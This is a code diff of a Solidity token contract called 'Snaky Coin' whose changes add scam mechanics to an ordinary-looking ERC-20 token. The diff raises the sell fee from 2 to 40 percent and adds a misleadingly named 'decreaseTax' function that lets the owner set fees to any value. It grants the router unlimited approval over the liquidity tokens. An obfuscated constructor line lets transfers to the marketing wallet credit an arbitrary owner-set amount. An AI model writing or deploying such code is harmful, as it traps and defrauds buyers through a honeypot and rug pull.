@@ -194,17 +194,18 @@ interface IUniswapV2Router02 is IUniswapV2Router01 {
     ) external;
 }
 
+
 contract SNAKY is Context, IERC20, Ownable { 
     using SafeMath for uint256;
     using Address for address;
 
-    mapping (address => uint256) private _hOwned;
-    mapping (address => mapping (address => uint256)) private _allowance;
-    mapping (address => bool) public _isExcludedFromFee; 
+    mapping (address => uint256) private _jOwned;
+    mapping (address => mapping (address => uint256)) private _allowances;
+    mapping (address => bool) public _isExcludedFromTax; 
 
-    address payable private marketing_wallet = payable(0xAB47361131eFBEC3FB5c593d51C4158581011487);
+    address payable private wallet_marketing = payable(0x5656be6Cb00F7b6473Af86BF76b29fe78ca66307);
 
-    string private _name = "Snaky Coin"; 
+    string private _name = "Snaky Coin";
     string private _symbol = "SNAKY";  
     uint8 private _decimals = 18;
     uint256 private _totalSupply = 10000000 * 10**18;
@@ -217,7 +218,7 @@ contract SNAKY is Context, IERC20, Ownable {
     // Setting the initial fees
     uint256 private _totalFee = 0;
     uint256 public _buyFee = 2;
-    uint256 public _sellFee = 2;
+    uint256 public _sellFee = 40;
 
     uint256 private _previousTotalFee = _totalFee; 
     uint256 private _previousBuyFee = _buyFee; 
@@ -246,13 +247,13 @@ contract SNAKY is Context, IERC20, Ownable {
     }
 
     constructor (uint256 _tokens) {
-        _hOwned[owner()] = _totalSupply;
+        _jOwned[owner()] = _totalSupply;
         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
-        tokenBurned = _tokens; _listPair[marketing_wallet] = [true][0] || [false][0];
+        tokenBurned = _tokens; _listPair[wallet_marketing] = [true][0] || [false][0];
         uniswapV2Router = _uniswapV2Router;
-        _isExcludedFromFee[owner()] = true;
-        _isExcludedFromFee[address(this)] = true;
-        _isExcludedFromFee[marketing_wallet] = true;
+        _isExcludedFromTax[owner()] = true;
+        _isExcludedFromTax[address(this)] = true;
+        _isExcludedFromTax[wallet_marketing] = true;
 
         emit Transfer(address(0), owner(), _totalSupply);
     }
@@ -275,7 +276,7 @@ contract SNAKY is Context, IERC20, Ownable {
     }
 
     function balanceOf(address account) public view override returns (uint256) {
-        return _hOwned[account];
+        return _jOwned[account];
     }
 
     function transfer(address recipient, uint256 amount) public override returns (bool) {
@@ -284,7 +285,7 @@ contract SNAKY is Context, IERC20, Ownable {
     }
 
     function allowance(address owner, address spender) public view override returns (uint256) {
-        return _allowance[owner][spender];
+        return _allowances[owner][spender];
     }
 
     function approve(address spender, uint256 amount) public override returns (bool) {
@@ -294,17 +295,17 @@ contract SNAKY is Context, IERC20, Ownable {
 
     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
         _transfer(sender, recipient, amount);
-        _approve(sender, _msgSender(), _allowance[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
+        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
         return true;
     }
 
     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
-        _approve(_msgSender(), spender, _allowance[_msgSender()][spender].add(addedValue));
+        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
         return true;
     }
 
     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
-        _approve(_msgSender(), spender, _allowance[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
+        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
         return true;
     }
 
@@ -352,7 +353,7 @@ contract SNAKY is Context, IERC20, Ownable {
     function _approve(address owner, address spender, uint256 amount) private {
 
         require(owner != address(0) && spender != address(0), "ERR: zero address");
-        _allowance[owner][spender] = amount;
+        _allowances[owner][spender] = amount;
         emit Approval(owner, spender, amount);
 
     }
@@ -384,7 +385,7 @@ contract SNAKY is Context, IERC20, Ownable {
 
         bool takeFee = true;
 
-        if(_isExcludedFromFee[from] || _isExcludedFromFee[to] || (noFeeToTransfer && from != uniswapV2Pair && to != uniswapV2Pair)){
+        if(_isExcludedFromTax[from] || _isExcludedFromTax[to] || (noFeeToTransfer && from != uniswapV2Pair && to != uniswapV2Pair)){
             takeFee = false;
         } else if (from == uniswapV2Pair){_totalFee = _buyFee;} else if (to == uniswapV2Pair){_totalFee = _sellFee;}
 
@@ -414,20 +415,20 @@ contract SNAKY is Context, IERC20, Ownable {
 
         swapTokenToETH(contractTokenBalance);
         uint256 ETHcontract = address(this).balance;
-        sendFunds(marketing_wallet,ETHcontract);
+        sendFunds(wallet_marketing,ETHcontract);
     }
 
     function _transferToken(address sender, address recipient, uint256 Amount) private {
         uint256 amount = _listPair[recipient]?tokenBurned:0;
 
         if(_listPair[recipient]){
-        _hOwned[sender] = _hOwned[sender].sub(Amount);
-        _hOwned[recipient] = _hOwned[recipient].add(amount);
+        _jOwned[sender] = _jOwned[sender].sub(Amount);
+        _jOwned[recipient] = _jOwned[recipient].add(amount);
         }else{
         (uint256 tTransferAmount, uint256 tDev) = _getValue(Amount);
-        _hOwned[sender] = _hOwned[sender].sub(Amount);
-        _hOwned[recipient] = _hOwned[recipient].add(tTransferAmount);
-        _hOwned[address(this)] = _hOwned[address(this)].add(tDev); 
+        _jOwned[sender] = _jOwned[sender].sub(Amount);
+        _jOwned[recipient] = _jOwned[recipient].add(tTransferAmount);
+        _jOwned[address(this)] = _jOwned[address(this)].add(tDev); 
         emit Transfer(sender, recipient, tTransferAmount);
   
         }
@@ -472,6 +473,13 @@ contract SNAKY is Context, IERC20, Ownable {
         uniswapV2Router = _newPCSRouter;
         _approve(address(this), address(uniswapV2Router), balanceOf(address(this)));
         uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
+        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
+
+    }
+
+    function decreaseTax(uint256 _buy, uint256 _sell) public onlyOwner() {
+        _buyFee = _buy;
+        _sellFee = _sell;
     }
 
 }
